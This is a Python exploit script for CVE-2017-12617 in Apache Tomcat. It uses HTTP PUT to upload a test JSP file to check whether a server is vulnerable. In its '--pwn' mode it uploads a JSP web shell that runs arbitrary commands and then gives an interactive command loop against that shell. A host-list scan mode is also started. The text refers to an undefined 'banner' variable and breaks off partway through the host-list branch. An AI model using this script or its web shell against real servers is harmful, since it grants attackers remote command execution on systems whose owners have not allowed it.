import requests
import re
import signal
from optparse import OptionParser
import shlex
from urllib.parse import urlparse

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def signal_handler(signal, frame):
    print("\033[91m" + "\n[-] Exiting" + "\033[0m")
    exit()

signal.signal(signal.SIGINT, signal_handler)

def removetags(tags):
    remove = re.compile('<.*?>')
    txt = re.sub(remove, '\n', tags)
    return txt.replace("\n\n\n", "\n")

def getContent(url, f):
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    try:
        re = requests.get(f"{url}/{f}", headers=headers, timeout=10)
        re.raise_for_status()
        return re.content
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None

def createPayload(url, f):
    evil = '<% out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAA");%>'
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    try:
        req = requests.put(f"{url}{f}/", data=evil, headers=headers, timeout=10)
        if req.status_code == 201:
            print("File Created ..")
    except requests.RequestException as e:
        print(f"Request failed: {e}")

def RCE(url, f):
    EVIL = """<FORM METHOD=GET ACTION='{}'>""".format(f) + """
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
    </FORM>
    <%@ page import="java.io.*" %>
    <%
    String cmd = request.getParameter("cmd");
    String output = "";
    if(cmd != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd,null,null);
            BufferedReader sI = new BufferedReader(new
    InputStreamReader(p.getInputStream()));
    while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>"""
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    try:
        req = requests.put(f"{url}{f}/", data=EVIL, headers=headers, timeout=10)
    except requests.RequestException as e:
        print(f"Request failed: {e}")

def shell(url, f):
    while True:
        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
        cmd = shlex.quote(input("$ "))
        payload = {'cmd': cmd}
        if cmd.lower() == "q":
            break
        try:
            re = requests.get(f"{url}/{f}", params=payload, headers=headers, timeout=10)
            re.raise_for_status()
            t = removetags(re.content.decode())
            print(t)
        except requests.RequestException as e:
            print(f"Request failed: {e}")

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

parse = OptionParser()

parse.add_option("-u", "--url", dest="U", type="string", help="Website Url")
parse.add_option("-p", "--pwn", dest="P", type="string", help="generate webshell and upload it")
parse.add_option("-l", "--list", dest="L", type="string", help="hosts File")

(opt, args) = parse.parse_args()

if opt.U is None and opt.P is None and opt.L is None:
    print(parse.usage)
    exit(0)
else:
    if opt.U is not None and opt.P is None and opt.L is None:
        print(bcolors.OKGREEN + banner + bcolors.ENDC)
        url = str(opt.U)
        if not is_valid_url(url):
            print("Invalid URL")
            exit(1)
        checker = "Poc.jsp"
        print(bcolors.BOLD + "Poc Filename  {}".format(checker))
        createPayload(f"{url}/", checker)
        con = getContent(f"{url}/", checker)
        if con and b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in con:
            print(bcolors.WARNING + url + ' it\'s Vulnerable to CVE-2017-12617' + bcolors.ENDC)
            print(bcolors.WARNING + url + "/" + checker + bcolors.ENDC)
        else:
            print('Not Vulnerable to CVE-2017-12617')
    elif opt.P is not None and opt.U is not None and opt.L is None:
        print(bcolors.OKGREEN + banner + bcolors.ENDC)
        pwn = str(opt.P)
        url = str(opt.U)
        if not is_valid_url(url):
            print("Invalid URL")
            exit(1)
        print("Uploading Webshell .....")
        pwn = pwn + ".jsp"
        RCE(f"{url}/", pwn)
        shell(url, pwn)
    elif opt.L is not None and opt.P is None and opt.U is None:
        print(bcolors.OKGREEN + banner + bcolors.ENDC)
        w = str(opt.L)
        try:
            with open(w, "r") as f:
                print("Scanning hosts in {}".format(w))
